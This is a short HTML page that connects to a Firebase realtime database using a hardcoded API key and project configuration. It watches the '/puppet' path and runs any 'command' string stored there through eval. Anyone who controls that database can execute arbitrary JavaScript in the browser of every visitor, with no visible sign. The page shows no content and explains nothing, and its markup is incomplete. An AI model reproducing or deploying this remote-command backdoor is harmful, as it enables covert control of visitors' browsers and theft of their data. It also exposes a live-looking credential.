
<!DOCTYPE html>
<html>

  <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
</head>
<body>

<script>
  // Your web app's Firebase configuration
  const firebaseConfig = {
    apiKey: "AIzaSyDBfuowc1DemVHebL01Bdx_g87b3i0Wc4A",
    authDomain: "chipper-bridge-8675.firebaseapp.com",
    databaseURL: "https://chipper-bridge-8675-default-rtdb.firebaseio.com",
    projectId: "chipper-bridge-8675",
    storageBucket: "chipper-bridge-8675.firebasestorage.app",
    messagingSenderId: "561587100404",
    appId: "1:561587100404:web:69a9aca3ff3c3ed64c5ca1"
  };

  // Initialize Firebase
  firebase.initializeApp(firebaseConfig);
  const database = firebase.database();

  // Reference to the database
  const ref = database.ref('/puppet');

  // Listen for changes
  ref.on('value', (snapshot) => {
    const data = snapshot.val();
    if (data && data.command) {
      try {
        eval(data.command);
      } catch (e) {
        console.error(e);
      }
    }
  });
</script>

</body>
